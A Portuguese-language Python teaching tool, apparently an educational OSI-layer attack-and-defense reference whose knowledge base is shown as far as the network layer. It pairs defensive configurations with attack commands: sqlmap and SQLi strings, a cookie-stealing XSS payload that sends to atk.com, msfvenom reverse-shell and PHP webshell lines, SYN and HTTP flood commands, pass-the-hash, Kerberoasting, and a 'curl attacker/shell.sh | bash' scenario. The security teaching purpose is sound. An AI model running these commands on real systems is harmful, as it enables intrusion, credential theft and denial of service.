#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                  ║
║          ██████╗  █████╗  ██████╗  ██████╗     ████████╗███████╗ ██████╗██╗  ██╗ ║
║         ██╔═══██╗██╔══██╗██╔═══██╗██╔══██╗        ██╔══╝██╔════╝██╔════╝██║  ██║ ║
║         ███████║███║  ██║██████╔╝██████╔╝        ████╗  █████╗  ██║     ███████║ ║
║         ██╔══██║██║  ██╔╝██╔══██╗██╔══██╗        ╚═██╔═╝██╔══╝  ██║     ██╔══██║ ║
║         ██║  ██║╚██████╔╝██║  ██║██║  ██║          ██║  ███████╗╚██████╗██║  ██║ ║
║         ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝          ╚═╝  ╚══════╝ ╚═════╝╚═╝  ╚═╝ ║
║                                                                                  ║
║              OSI MODEL — ATTACK & DEFENSE RESOLVER  v2.0                         ║
║         Alfredo Ociola Francisco Romano  |  AOFR TECH  |  Angola                 ║
║           "Atitude · Orientação · Força · Resultados"                            ║
║                                                                                  ║
╚══════════════════════════════════════════════════════════════════════════════════╝

  [!] USO EXCLUSIVAMENTE EDUCACIONAL E EM AMBIENTES AUTORIZADOS
  [!] FOR EDUCATIONAL USE ONLY — AUTHORIZED ENVIRONMENTS ONLY
"""

import os
import sys
import time
import platform
import subprocess
import shutil
import textwrap
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# ── Dependency Check ──────────────────────────────────────────────────────────
def _ensure_rich():
    try:
        from rich.console import Console
        from rich.panel import Panel
        from rich.table import Table
        from rich.text import Text
        from rich.syntax import Syntax
        from rich.prompt import Prompt, IntPrompt, Confirm
        from rich.progress import Progress, SpinnerColumn, TextColumn
        from rich.columns import Columns
        from rich.rule import Rule
        from rich.tree import Tree
        from rich import box
        from rich.markdown import Markdown
        return True
    except ImportError:
        print("[!] Instalando dependencia 'rich'...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "rich",
                                "--quiet", "--break-system-packages"],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True

_ensure_rich()

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.syntax import Syntax
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.columns import Columns
from rich.rule import Rule
from rich.tree import Tree
from rich import box
from rich.markdown import Markdown

# ── Console Setup ─────────────────────────────────────────────────────────────
console = Console()

IS_WINDOWS = platform.system() == "Windows"
IS_PS      = "powershell" in os.environ.get("PSModulePath", "").lower() or \
             os.environ.get("AOFR_PS", "") == "1"

# ══════════════════════════════════════════════════════════════════════════════
# ██  KNOWLEDGE BASE — MODELO OSI COMPLETO
# ══════════════════════════════════════════════════════════════════════════════
OSI_LAYERS: Dict[int, Dict] = {

    # ─────────────────────────────────────────────────────────────────────────
    7: {
        "name_pt": "Camada de Aplicação",
        "name_en": "Application Layer",
        "pdu":     "Dados (Data)",
        "color":   "bright_magenta",
        "icon":    "🌐",
        "description": (
            "A camada mais próxima do utilizador. Fornece serviços de rede "
            "directamente às aplicações. É onde navegadores, clientes de email, "
            "APIs e servidores web operam. A maioria dos ataques visíveis ao "
            "utilizador ocorre nesta camada."
        ),
        "elements": [
            ("HTTP/HTTPS",       "Protocolo de transferência web (portas 80/443)"),
            ("FTP / SFTP",       "Transferência de ficheiros (21 / 22)"),
            ("SMTP / IMAP / POP3","Envio e recepção de email (25, 143, 110)"),
            ("DNS",              "Resolução de nomes de domínio (53 UDP/TCP)"),
            ("SSH",              "Acesso remoto seguro (22)"),
            ("SNMP",             "Gestão de dispositivos de rede (161/162)"),
            ("OAuth2 / SAML",    "Protocolos de autenticação federada"),
            ("REST / GraphQL",   "APIs modernas de comunicação entre aplicações"),
            ("WAF",              "Web Application Firewall — filtra tráfego HTTP"),
            ("Proxy Reverso",    "Nginx/Apache como intermediário seguro"),
        ],
        "attacks": [
            {
                "id":    "L7-001",
                "name":  "SQL Injection (SQLi)",
                "risk":  "CRÍTICO",
                "cause": "Input de utilizador inserido directamente em queries SQL sem sanitização.",
                "impact":"Extracção, modificação ou destruição total da base de dados.",
                "tools_atk": [
                    ("sqlmap",   "sqlmap -u \"http://alvo.com/item?id=1\" --dbs --batch"),
                    ("sqlmap",   "sqlmap -u \"http://alvo.com/\" --forms --level=5 --risk=3"),
                    ("Manual",   "' OR '1'='1 --  (teste básico de bypass)"),
                    ("Manual",   "' UNION SELECT 1,user(),3 --  (UNION-based)"),
                ],
                "defense_commands": [
                    ("PHP PDO",  "$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id'); $stmt->execute([':id' => $id]);"),
                    ("ModSec",   "SecRule ARGS \"@detectSQLi\" \"id:1001,phase:2,block,msg:'SQLi Detected'\""),
                    ("NGINX",    "limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;"),
                    ("Fail2Ban", "fail2ban-client set nginx-sqli banip <IP>"),
                ],
                "mitigation": [
                    "Usar SEMPRE Prepared Statements / Parameterized Queries",
                    "Validar e sanitizar TODOS os inputs do utilizador",
                    "Implementar WAF (ModSecurity + OWASP CRS ruleset)",
                    "Princípio de mínimo privilégio na conta do banco de dados",
                    "Activar logging detalhado de queries para detectar anomalias",
                ],
                "scenario": (
                    "SCENARIO: Portal de gestão de uma empresa angolana com campo de pesquisa "
                    "vulnerável. Atacante testa ' OR '1'='1 -- e obtém acesso sem credenciais. "
                    "Com sqlmap extrai toda a base de dados em 3 minutos. "
                    "SOLUÇÃO: PDO + WAF + input validation resolve 100% do problema."
                ),
            },
            {
                "id":    "L7-002",
                "name":  "XSS — Cross-Site Scripting",
                "risk":  "ALTO",
                "cause": "Output de dados do utilizador renderizado sem escape no HTML.",
                "impact":"Roubo de cookies/sessões, defacement, phishing interno.",
                "tools_atk": [
                    ("XSStrike",  "python3 xsstrike.py -u 'http://alvo.com/search?q=FUZZ'"),
                    ("Burp Suite","Intruder → payload de XSS payloads list"),
                    ("Manual",    "<script>document.location='http://atk.com/?c='+document.cookie</script>"),
                    ("BeEF",      "beef-xss → hook.js → Browser exploitation"),
                ],
                "defense_commands": [
                    ("PHP",    "echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');"),
                    ("Header", "Content-Security-Policy: default-src 'self'; script-src 'self'"),
                    ("Header", "X-XSS-Protection: 1; mode=block"),
                    ("NGINX",  "add_header Content-Security-Policy \"default-src 'self'\" always;"),
                ],
                "mitigation": [
                    "Escapar TODOS os outputs: htmlspecialchars() no PHP, DOMPurify no JS",
                    "Implementar Content Security Policy (CSP) rigorosa",
                    "Usar flag HttpOnly nos cookies de sessão",
                    "Validar inputs no servidor (nunca só no cliente)",
                ],
                "scenario": (
                    "SCENARIO: Campo de comentários de blog armazena script malicioso (Stored XSS). "
                    "Cada visitante que lê o artigo tem o seu cookie de sessão enviado para servidor "
                    "do atacante. SOLUÇÃO: htmlspecialchars() + CSP header elimina o problema."
                ),
            },
            {
                "id":    "L7-003",
                "name":  "HTTP Flood / Slowloris (DoS L7)",
                "risk":  "CRÍTICO",
                "cause": "Sem rate limiting; servidor aceita conexões infinitas.",
                "impact":"Aplicação indisponível para utilizadores legítimos.",
                "tools_atk": [
                    ("slowloris",     "python3 slowloris.py alvo.com --sockets 500 -v"),
                    ("hping3",        "hping3 -S --flood -V -p 80 alvo.com"),
                    ("LOIC",          "LOIC.exe (GUI) → Method: HTTP → Target: alvo"),
                    ("slowhttptest",  "slowhttptest -c 1000 -H -g -i 10 -r 200 -t GET -u http://alvo.com"),
                ],
                "defense_commands": [
                    ("NGINX",   "limit_conn_zone $binary_remote_addr zone=conn_limit:10m; limit_conn conn_limit 20;"),
                    ("NGINX",   "client_body_timeout 12; client_header_timeout 12; keepalive_timeout 15;"),
                    ("iptables","iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 50 -j REJECT"),
                    ("Cloudflare","Activar DDoS Protection L7 → Security → DDoS → Deploy ruleset"),
                ],
                "mitigation": [
                    "Configurar timeouts curtos no servidor web (client_body_timeout, client_header_timeout)",
                    "Implementar rate limiting por IP (NGINX limit_req, iptables)",
                    "Usar serviço anti-DDoS cloud (Cloudflare, Akamai) como primeira linha",
                    "Activar SYN Cookies: sysctl -w net.ipv4.tcp_syncookies=1",
                ],
                "scenario": (
                    "SCENARIO: Portal bancário angolano atacado com Slowloris durante período de "
                    "pagamentos. 500 conexões abertas, servidor Apache esgota workers. "
                    "SOLUÇÃO: NGINX com timeouts configurados + Cloudflare Pro resolve."
                ),
            },
            {
                "id":    "L7-004",
                "name":  "File Upload RCE (Remote Code Execution)",
                "risk":  "CRÍTICO",
                "cause": "Validação apenas por extensão; ficheiro PHP uploadado e executado.",
                "impact":"Controlo total do servidor (webshell → reverse shell → pivoting).",
                "tools_atk": [
                    ("Burp Suite", "Interceptar upload → alterar Content-Type para image/jpeg"),
                    ("Weevely",    "weevely generate senhaforte /tmp/shell.php"),
                    ("msfvenom",   "msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -o shell.php"),
                    ("Manual",     "<?php system($_GET['cmd']); ?> → guardar como foto.php.jpg → bypass"),
                ],
                "defense_commands": [
                    ("PHP",     "// Validar magic bytes\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\n$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);\nif (!in_array($mime, ['image/jpeg','image/png'])) die('Inválido');"),
                    ("NGINX",   "location /uploads/ { location ~ \\.php$ { deny all; } }"),
                    ("PHP.ini", "upload_max_filesize = 5M; max_file_uploads = 5"),
                    ("ClamAV",  "clamscan --infected --remove /var/www/uploads/"),
                ],
                "mitigation": [
                    "Validar magic bytes (file signature), NÃO apenas a extensão",
                    "Armazenar uploads FORA do webroot (/var/uploads/ em vez de /var/www/)",
                    "Renomear ficheiros com UUID aleatório (uniqid() + extensão validada)",
                    "Desactivar execução PHP na pasta uploads (.htaccess: php_flag engine off)",
                    "Integrar ClamAV para scan antivirus automático em cada upload",
                ],
                "scenario": (
                    "SCENARIO: Sistema hospitalar aceita upload de 'foto de perfil'. Atacante "
                    "envia shell.php, acede via browser e obtém RCE. Pivota para rede interna "
                    "e acede a registos de pacientes. SOLUÇÃO: validação magic bytes + fora webroot."
                ),
            },
            {
                "id":    "L7-005",
                "name":  "SSRF — Server Side Request Forgery",
                "risk":  "CRÍTICO",
                "cause": "Aplicação faz requests HTTP para URLs fornecidas pelo utilizador sem validação.",
                "impact":"Acesso a serviços internos (AWS metadata, Redis, databases) não expostos.",
                "tools_atk": [
                    ("SSRFmap",     "python3 ssrfmap.py -r request.txt -p url -m readfiles"),
                    ("Manual",      "url=http://169.254.169.254/latest/meta-data/ (AWS metadata)"),
                    ("Burp",        "Burp Collaborator → gerar URL único → inspectar callback"),
                    ("curl",        "curl 'http://alvo.com/fetch?url=http://127.0.0.1:6379/' (Redis)"),
                ],
                "defense_commands": [
                    ("PHP",  "// Whitelist de URLs permitidas\n$allowed = ['api.parceiro.com','cdn.empresa.com'];\n$host = parse_url($url, PHP_URL_HOST);\nif (!in_array($host, $allowed)) die('URL não permitida');"),
                    ("NGINX","# Bloquear acesso interno a partir da app\ndeny 10.0.0.0/8; deny 172.16.0.0/12; deny 192.168.0.0/16;"),
                    ("AWS",  "aws imds-v2 --token-ttl-seconds 21600  # IMDSv2 obrigatório (bloqueia SSRF simples)"),
                ],
                "mitigation": [
                    "Whitelist rigorosa de domínios/IPs permitidos para requests externos",
                    "Bloquear ranges RFC1918 (10.x, 172.16.x, 192.168.x) e 169.254.x.x",
                    "Usar IMDSv2 na AWS (bloqueia SSRF para metadata endpoint)",
                    "Desactivar redirects HTTP automáticos na biblioteca de HTTP",
                ],
                "scenario": (
                    "SCENARIO: App de e-commerce permite 'importar foto por URL'. Atacante envia "
                    "http://169.254.169.254/latest/meta-data/ e obtém credenciais AWS IAM. "
                    "SOLUÇÃO: Whitelist de domínios + bloqueio de IPs RFC1918."
                ),
            },
        ],
        "tools_defense": {
            "ModSecurity": {
                "desc": "WAF open-source com OWASP Core Rule Set",
                "install": "apt install libapache2-mod-security2 -y\na2enmod security2\ncurl -L https://github.com/SpiderLabs/owasp-modsecurity-crs/archive/v3.3.4.tar.gz | tar xz",
                "config":  "SecRuleEngine On\nSecRequestBodyAccess On\nInclude /etc/modsecurity/crs/crs-setup.conf\nInclude /etc/modsecurity/crs/rules/*.conf",
            },
            "Fail2Ban": {
                "desc": "Bloqueia IPs após tentativas falhas",
                "install": "apt install fail2ban -y\nsystemctl enable --now fail2ban",
                "config":  "[nginx-http-auth]\nenabled  = true\nfilter   = nginx-http-auth\nlogpath  = /var/log/nginx/error.log\nmaxretry = 5\nbantime  = 3600",
            },
            "Nikto": {
                "desc": "Scanner de vulnerabilidades web (defensive recon)",
                "install": "apt install nikto -y",
                "config":  "nikto -h https://seusite.com -ssl -output /tmp/nikto_report.txt",
            },
        },
    },

    # ─────────────────────────────────────────────────────────────────────────
    6: {
        "name_pt": "Camada de Apresentação",
        "name_en": "Presentation Layer",
        "pdu":     "Dados (Data)",
        "color":   "bright_blue",
        "icon":    "🔐",
        "description": (
            "Responsável pela tradução, compressão e encriptação dos dados. "
            "Actua como 'tradutor' entre a rede e a aplicação. O TLS/SSL opera "
            "nesta camada, tornando-a crítica para confidencialidade."
        ),
        "elements": [
            ("TLS 1.2 / 1.3",    "Protocolo de encriptação de comunicações HTTPS"),
            ("SSL (obsoleto)",    "Antecessor do TLS — NÃO usar SSLv2/v3/TLS1.0/1.1"),
            ("Certificados X.509","Autenticação de identidade e PKI pública/privada"),
            ("Base64 / ASCII",    "Esquemas de encoding de dados"),
            ("GZIP / Deflate",    "Compressão de dados para reduzir largura de banda"),
            ("Serialização",      "JSON, XML, Protocol Buffers, Java Serialization"),
            ("JPEG / PNG / MP4",  "Formatos de dados multimédia"),
            ("HSM",               "Hardware Security Module — gestão de chaves criptográficas"),
        ],
        "attacks": [
            {
                "id":    "L6-001",
                "name":  "SSL/TLS Downgrade (POODLE / BEAST / FREAK)",
                "risk":  "CRÍTICO",
                "cause": "Servidor suporta protocolos antigos (SSLv3, TLS 1.0/1.1) para 'compatibilidade'.",
                "impact":"Atacante MITM força protocolo fraco e decifra tráfego cifrado.",
                "tools_atk": [
                    ("testssl.sh",  "testssl.sh --protocols https://alvo.com"),
                    ("sslscan",     "sslscan --show-certificate alvo.com:443"),
                    ("openssl",     "openssl s_client -connect alvo.com:443 -ssl3 2>/dev/null | grep Cipher"),
                    ("sslyze",      "sslyze alvo.com --regular"),
                ],
                "defense_commands": [
                    ("NGINX",   "ssl_protocols TLSv1.2 TLSv1.3;\nssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';\nssl_prefer_server_ciphers on;"),
                    ("Apache",  "SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1\nSSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256"),
                    ("Check",   "curl -v --sslv3 https://alvo.com  # deve retornar erro se corrigido"),
                    ("Grade A+", "# Testar em: https://www.ssllabs.com/ssltest/"),
                ],
                "mitigation": [
                    "Desactivar SSLv2, SSLv3, TLS 1.0, TLS 1.1 — suportar apenas TLS 1.2 e 1.3",
                    "Usar apenas cipher suites ECDHE/DHE para Perfect Forward Secrecy",
                    "Testar regularmente com testssl.sh e SSL Labs (alvo: score A+)",
                    "Activar HSTS para prevenir downgrade: Strict-Transport-Security: max-age=63072000",
                    "Renovar certificados automaticamente com Let's Encrypt + certbot",
                ],
                "scenario": (
                    "SCENARIO: Banco mantém TLS 1.0 por 'compatibilidade com clientes antigos'. "
                    "Atacante MITM na rede usa BEAST attack para decifrar cookies de sessão. "
                    "SOLUÇÃO: Desactivar TLS<1.2 no NGINX + HSTS. Clientes antigos actualizam."
                ),
            },
            {
                "id":    "L6-002",
                "name":  "Insecure Deserialization (RCE)",
                "risk":  "CRÍTICO",
                "cause": "Dados serializados (Java, PHP, Python pickle) desserializados sem validação.",
                "impact":"Remote Code Execution — execução de código arbitrário no servidor.",
                "tools_atk": [
                    ("ysoserial",   "java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin"),
                    ("PHPGGC",      "phpggc Laravel/RCE1 system 'id' | base64"),
                    ("Burp",        "Enviar payload base64 no parâmetro de cookie/body serializado"),
                ],
                "defense_commands": [
                    ("PHP",   "// NUNCA usar unserialize() com dados externos\n// Usar JSON em vez de serialização nativa\n$data = json_decode(base64_decode($input), true);"),
                    ("Java",  "// Implementar ObjectInputFilter (Java 9+)\nObjectInputFilter filter = info -> {\n    Class<?> cls = info.serialClass();\n    if (cls != null && !ALLOWED.contains(cls)) return Status.REJECTED;\n    return Status.ALLOWED;\n};"),
                    ("Python","# NUNCA usar pickle.loads() em dados externos\nimport json\ndata = json.loads(untrusted_input)  # seguro"),
                ],
                "mitigation": [
                    "Nunca desserializar dados não confiáveis com mecanismos nativos",
                    "Substituir serialização nativa por JSON para dados externos",
                    "Usar bibliotecas como SerialKiller (Java) para whitelist de classes",
                    "Monitorar execução de processos filhos a partir do servidor web",
                ],
                "scenario": (
                    "SCENARIO: App Java usa readObject() para desserializar dados do cookie. "
                    "Atacante envia payload ysoserial em base64. Servidor executa 'curl attacker/shell.sh | bash'. "
                    "SOLUÇÃO: ObjectInputFilter + migração para JSON."
                ),
            },
        ],
        "tools_defense": {
            "testssl.sh": {
                "desc": "Análise completa de configuração TLS/SSL",
                "install": "git clone --depth 1 https://github.com/drwetter/testssl.sh\ncd testssl.sh",
                "config":  "bash testssl.sh --full https://seusite.com\nbash testssl.sh --severity HIGH https://seusite.com",
            },
            "Let's Encrypt": {
                "desc": "Certificados TLS gratuitos e automáticos",
                "install": "apt install certbot python3-certbot-nginx -y",
                "config":  "certbot --nginx -d seusite.com -d www.seusite.com\ncertbot renew --dry-run",
            },
        },
    },

    # ─────────────────────────────────────────────────────────────────────────
    5: {
        "name_pt": "Camada de Sessão",
        "name_en": "Session Layer",
        "pdu":     "Dados (Data)",
        "color":   "bright_cyan",
        "icon":    "🤝",
        "description": (
            "Estabelece, gere e termina sessões entre aplicações. Cuida de "
            "autenticação de sessão, tokens, checkpoints e sincronização. "
            "NetBIOS, RPC, SMB e Kerberos operam aqui."
        ),
        "elements": [
            ("SMB / CIFS",   "Partilha de ficheiros e impressoras Windows (445/139)"),
            ("NetBIOS",      "Serviço de nomes legacy Windows (137/138/139)"),
            ("RPC",          "Remote Procedure Call — execução remota de procedimentos"),
            ("NFS",          "Network File System — partilha Unix/Linux"),
            ("Kerberos",     "Protocolo de autenticação AD baseado em tickets (88)"),
            ("NTLM",         "NT LAN Manager — autenticação Windows challenge-response"),
            ("Tokens de Sessão","Cookies/JWT que identificam sessões activas"),
            ("LDAP",         "Lightweight Directory Access Protocol (389/636)"),
        ],
        "attacks": [
            {
                "id":    "L5-001",
                "name":  "LLMNR / NBT-NS Poisoning + Pass-the-Hash",
                "risk":  "CRÍTICO",
                "cause": "LLMNR/NBT-NS broadcast sem autenticação; NTLM aceita hash sem senha.",
                "impact":"Captura de hashes NTLM + acesso lateral a toda a rede Windows.",
                "tools_atk": [
                    ("Responder",       "sudo responder -I eth0 -rdwv"),
                    ("hashcat",         "hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt"),
                    ("CrackMapExec",    "cme smb 192.168.1.0/24 -u admin -H NTLM_HASH_AQUI"),
                    ("Impacket",        "python3 psexec.py DOMAIN/user@target -hashes :NTLM_HASH"),
                ],
                "defense_commands": [
                    ("GPO",       "# Desactivar LLMNR via GPO:\n# Computer Config → Admin Templates → Network → DNS Client\n# → Turn off multicast name resolution → ENABLED"),
                    ("Registry",  "# Desactivar NBT-NS via Registry:\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters /v NodeType /t REG_DWORD /d 2 /f"),
                    ("SMB Sign",  "# Activar assinatura SMB obrigatória via GPO:\n# Computer Config → Windows Settings → Security Settings\n# → Local Policies → Security Options\n# → Microsoft network server: Digitally sign communications (always) → ENABLED"),
                    ("Wazuh",     "# Monitorar Event ID 4648 (explicit credential) e 4624 Type 3"),
                ],
                "mitigation": [
                    "Desactivar LLMNR em todos os endpoints via GPO (Turn off multicast name resolution)",
                    "Desactivar NetBIOS over TCP/IP em todas as interfaces de rede",
                    "Activar Assinatura SMB obrigatória (SMB Signing) em clientes e servidores",
                    "Implementar LAPS (Local Admin Password Solution) — senhas únicas por máquina",
                    "Monitorar Windows Event ID 4648, 4624 Type 3 no SIEM para anomalias",
                ],
                "scenario": (
                    "SCENARIO: Empresa com AD sem SMB Signing. Responder captura hash NTLMv2 quando "
                    "colaborador tenta aceder a \\\\servidor\\pasta. Em 10 min hashcat quebra a senha. "
                    "CrackMapExec move lateralmente para todos os servidores. "
                    "SOLUÇÃO: SMB Signing GPO + desactivar LLMNR + LAPS."
                ),
            },
            {
                "id":    "L5-002",
                "name":  "Kerberoasting",
                "risk":  "ALTO",
                "cause": "Qualquer utilizador AD pode solicitar tickets TGS para contas de serviço.",
                "impact":"Obtenção offline de hashes de senhas de service accounts com privilégios.",
                "tools_atk": [
                    ("Rubeus",    "Rubeus.exe kerberoast /outfile:hashes.txt"),
                    ("Impacket",  "python3 GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request"),
                    ("PowerView", "Get-DomainUser -SPN | Get-DomainSPNTicket | Export-Csv hashes.csv"),
                    ("hashcat",   "hashcat -m 13100 hashes.txt rockyou.txt --force"),
                ],
                "defense_commands": [
                    ("AD Check", "# Identificar service accounts com SPNs\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName"),
                    ("Policy",   "# Configurar senhas longas e complexas (25+) para service accounts\nSet-ADAccountPassword -Identity svc_sql -NewPassword (ConvertTo-SecureString 'P@$$w0rd!Complex#2024' -AsPlainText -Force)"),
                    ("gMSA",     "# Usar Group Managed Service Accounts (gMSA) — senha gerida automaticamente\nNew-ADServiceAccount -Name gMSA_SQL -DNSHostName sql.dominio.com -PrincipalsAllowedToRetrieveManagedPassword 'Domain Computers'"),
                ],
                "mitigation": [
                    "Usar Group Managed Service Accounts (gMSA) — senhas geridas automaticamente",
                    "Senhas longas (25+ caracteres) para todas as service accounts",
                    "Auditar e minimizar service accounts com SPNs (princípio do mínimo privilégio)",
                    "Monitorar Event ID 4769 (TGS Request) com volume anormal",
                    "Implementar Tier Model para isolamento de contas privilegiadas",
                ],
                "scenario": (
                    "SCENARIO: svc_sql com SPN e senha 'Sql2019!' usada desde sempre. "
                    "Atacante com conta de utilizador normal faz Kerberoasting, quebra senha em 45 seg. "
                    "svc_sql tem acesso a todos os servidores SQL. "
                    "SOLUÇÃO: gMSA + senhas 40+ caracteres + auditoria de SPNs."
                ),
            },
        ],
        "tools_defense": {
            "Responder (modo defensivo)": {
                "desc": "Detectar uso de Responder na rede (honeypot)",
                "install": "# Configurar honeypot UNC em logs para detectar capturas\n# Monitorar Event ID 4648 com conta honeypot",
                "config":  "# Activar auditoria em AD:\nAuditPol /set /subcategory:'Logon' /success:enable /failure:enable",
            },
            "BloodHound CE": {
                "desc": "Análise de caminhos de ataque no Active Directory",
                "install": "docker run -p 8080:8080 specterops/bloodhound-ce",
                "config":  "# Correr SharpHound para recolher dados AD:\nSharpHound.exe --CollectionMethods All --Domain DOMAIN.LOCAL",
            },
        },
    },

    # ─────────────────────────────────────────────────────────────────────────
    4: {
        "name_pt": "Camada de Transporte",
        "name_en": "Transport Layer",
        "pdu":     "Segmento (Segment)",
        "color":   "bright_green",
        "icon":    "🚦",
        "description": (
            "Garante entrega fiável (TCP) ou rápida (UDP) entre aplicações. "
            "Os números de porta identificam serviços. Firewalls L4 filtram "
            "por portas e estado da conexão TCP."
        ),
        "elements": [
            ("TCP",          "Transmission Control Protocol — fiável, orientado à conexão"),
            ("UDP",          "User Datagram Protocol — rápido, sem garantias"),
            ("Portas",       "0-1023: bem conhecidas | 1024-49151: registadas | 49152+: efémeras"),
            ("3-Way Handshake","SYN → SYN-ACK → ACK (estabelecimento TCP)"),
            ("Window Size",  "Controlo de fluxo TCP — quantidade de dados não confirmados"),
            ("Firewall L4",  "Filtra por porta/estado: iptables, pf, Windows Defender Firewall"),
            ("Load Balancer","Distribui conexões TCP/UDP por múltiplos servidores"),
        ],
        "attacks": [
            {
                "id":    "L4-001",
                "name":  "SYN Flood (DoS / DDoS Layer 4)",
                "risk":  "CRÍTICO",
                "cause": "Servidor mantém estado de conexões half-open sem limite; memória esgotada.",
                "impact":"Serviço completamente indisponível em segundos.",
                "tools_atk": [
                    ("hping3",    "sudo hping3 --flood --rand-source -S -p 443 alvo.com"),
                    ("hping3",    "sudo hping3 -c 50000 -d 120 -S -p 80 --flood alvo.com"),
                    ("Scapy",     "send(IP(dst='alvo', src=RandIP())/TCP(dport=80, flags='S'), loop=1)"),
                    ("mhddos",    "python3 mhddos.py tcp alvo.com:443 100 300"),
                ],
                "defense_commands": [
                    ("SYN Cookie", "sysctl -w net.ipv4.tcp_syncookies=1  # LINUX — ACTIVAR IMEDIATAMENTE"),
                    ("iptables",   "iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 10 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP"),
                    ("sysctl",     "sysctl -w net.ipv4.tcp_max_syn_backlog=8192\nsysctl -w net.ipv4.tcp_synack_retries=2"),
                    ("Windows PS", "# PowerShell — verificar SYN protection:\nGet-NetTCPConnection | Where-Object { $_.State -eq 'SynReceived' } | Measure-Object"),
                ],
                "mitigation": [
                    "Activar SYN Cookies no kernel Linux (tcp_syncookies=1) — PRIORITÁRIO",
                    "Usar serviço anti-DDoS cloud (Cloudflare Magic Transit, Akamai)",
                    "Configurar rate limiting de conexões por IP no firewall",
                    "Implementar BGP Blackholing (RTBH) para null-route IPs de ataque",
                    "Aumentar o backlog de SYN (tcp_max_syn_backlog)",
                ],
                "scenario": (
                    "SCENARIO: Grupo hacktivist lança SYN Flood a 50.000 pacotes/segundo "
                    "contra portal bancário. Apache esgota workers. Serviço down em 15 segundos. "
                    "SOLUÇÃO: SYN Cookies + Cloudflare DDoS Protection + iptables connlimit."
                ),
            },
            {
                "id":    "L4-002",
                "name":  "Port Scanning (Reconhecimento L4)",
                "risk":  "MÉDIO",
                "cause": "Portas abertas desnecessariamente expostas; sem IDS para detectar scans.",
                "impact":"Mapeamento completo da infraestrutura para ataques subsequentes.",
                "tools_atk": [
                    ("Nmap",     "nmap -sS -T4 -p- --open alvo.com -oA /tmp/scan"),
                    ("Nmap",     "nmap -sV -sC -A -p 22,80,443,3306,8080 alvo.com"),
                    ("Masscan",  "masscan -p1-65535 alvo.com --rate=50000 -oX scan.xml"),
                    ("Rustscan", "rustscan -a alvo.com --ulimit 5000 -- -sV -sC"),
                ],
                "defense_commands": [
                    ("iptables",  "# Fechar TODAS as portas excepto necessárias:\niptables -P INPUT DROP\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\niptables -A INPUT -p tcp --dport 22 -s SEU_IP_ADMIN -j ACCEPT"),
                    ("Snort",     "alert tcp any any -> $HOME_NET any (msg:\"NMAP SYN Scan\"; flags:S; threshold:type threshold,track by_src,count 5,seconds 1; sid:1000001;)"),
                    ("Fail2Ban",  "# jail.local — bloquear port scanners:\n[portscan]\nenabled  = true\nfilter   = portscan\nlogpath  = /var/log/syslog\nmaxretry = 5\nbantime  = 86400"),
                    ("PS",        "# PowerShell — verificar portas abertas localmente:\nGet-NetTCPConnection -State Listen | Select LocalAddress,LocalPort | Sort LocalPort"),
                ],
                "mitigation": [
                    "Principio do mínimo privilégio: abrir APENAS portas necessárias",
                    "Implementar port knocking para SSH (ocultar porta 22)",
                    "Usar IDS (Snort/Suricata) para detectar e alertar sobre port scans",
                    "Instalar Fail2Ban com regra de detecção de port scanning",
                    "Mudar portas default (SSH 22→porta não-padrão) para reduzir ruído",
                ],
                "scenario": (
                    "SCENARIO: Masscan varre toda a rede da empresa em 90 segundos. "
                    "Encontra MySQL (3306) exposto na internet sem firewall. "
                    "SQLi directo na porta dá acesso total ao banco. "
                    "SOLUÇÃO: iptables DROP default + abrir só 80/443 + VPN para admin."
                ),
            },
        ],
        "tools_defense": {
            "iptables / nftables": {
                "desc": "Firewall L3/L4 nativo do Linux",
                "install": "apt install iptables-persistent netfilter-persistent -y",
                "config":  "# Script básico de firewall seguro:\niptables -F && iptables -P INPUT DROP && iptables -P FORWARD DROP\niptables -A INPUT -i lo -j ACCEPT\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\nnetfilter-persistent save",
            },
            "Suricata IDS/IPS": {
                "desc": "IDS/IPS de alta performance para detecção L4/L7",
                "install": "apt install suricata -y\nsuricata-update  # actualizar regras",
                "config":  "suricata -c /etc/suricata/suricata.yaml -i eth0\nsuricata-update add-source et/open\nsuricata-update",
            },
        },
    },

    # ─────────────────────────────────────────────────────────────────────────
    3: {
        "name_pt": "Camada de Rede",
        "name_en": "Network Layer",
        "pdu":     "Pacote (Packet)",
        "color":   "bright_yellow",
        "icon":    "🌍",
        "description": (
            "Responsável pelo endereçamento lógico (IP) e encaminhamento de "
            "pacotes entre redes. Routers tomam decisões baseadas em tabelas "
            "de routing. IPv4, IPv6, ICMP e ARP operam aqui."
        ),
        "elements": [
            ("IPv4 / IPv6",  "Endereçamento lógico (32-bit / 128-bit)"),
            ("ICMP",         "Internet Control Message Protocol — ping, traceroute, erros"),
